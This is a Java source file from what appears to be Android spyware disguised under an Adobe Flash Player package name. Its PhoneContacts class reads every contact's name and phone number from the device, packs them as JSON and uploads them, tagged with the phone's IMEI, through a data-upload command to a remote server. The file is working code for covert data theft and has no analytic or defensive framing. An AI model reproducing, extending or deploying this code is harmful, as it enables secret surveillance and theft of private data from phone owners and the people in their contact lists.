package com.adobe.flashplayer.data;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import com.adobe.flashplayer.Public;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.MyLog;

import android.content.pm.PackageManager;


public class PhoneContacts {
    private static final String TAG = "[ljg]PhoneContacts";



    public PhoneContacts(Context context){

    }



    public static boolean getPhoneContacts(Context context) {
        try {
            Log.e(TAG, "getPhoneContacts");

            JSONArray jsarray = new JSONArray();

            int granted = ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS);
            if (granted == PackageManager.PERMISSION_GRANTED) {

                ContentResolver resolver = context.getContentResolver();
                String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
                Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        cols, null, null, null);
                if (cursor != null && cursor.getCount() > 0) {
                    int j = 0;
                    for (int i = 0; i < cursor.getCount(); i++) {
                        cursor.moveToPosition(i);
                        int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                        int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        String name = cursor.getString(nameFieldColumnIndex);
                        String number = cursor.getString(numberFieldColumnIndex);

                        JSONObject jsobj = new JSONObject();
                        jsobj.put("称呼", name);
                        jsobj.put("号码", number);
                        jsarray.put(j, jsobj);
                        j++;
                    }
                    cursor.close();
                }
                if (NetworkUtils.isNetworkAvailable(context)) {
                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_CONTACTS, Public.IMEI);
                }else{

                }
                return true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("UserContacts exception:" + error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        return false;
    }




}
